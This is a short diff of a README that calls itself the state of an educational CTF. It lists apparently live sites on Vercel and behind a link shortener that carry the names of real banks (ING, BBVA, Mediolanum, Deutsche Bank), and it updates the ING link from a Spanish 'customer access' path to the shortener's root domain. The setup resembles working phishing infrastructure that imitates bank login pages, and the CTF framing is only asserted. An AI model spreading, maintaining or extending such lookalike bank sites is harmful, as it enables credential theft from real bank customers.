@@ -5,7 +5,7 @@ This repository contains the configuration and state for a CTF focused on educat
 ## Current State (as of 2026-05-08)
 
 ### Active Sites (Vercel)
-- **ING**: [banca.short.gy/acceso-clientes](https://banca.short.gy/acceso-clientes) (Updated domain)
+- **ING**: [https://banca.short.gy](https://banca.short.gy) (Root domain, new destination)
 - **BBVA**: [vercel-bbva.vercel.app](https://vercel-bbva.vercel.app)
 - **Mediolanum**: [vercel-mediolanum.vercel.app](https://vercel-mediolanum.vercel.app)
 - **Deutsche Bank**: [vercel-deutschebank.vercel.app](https://vercel-deutschebank.vercel.app)
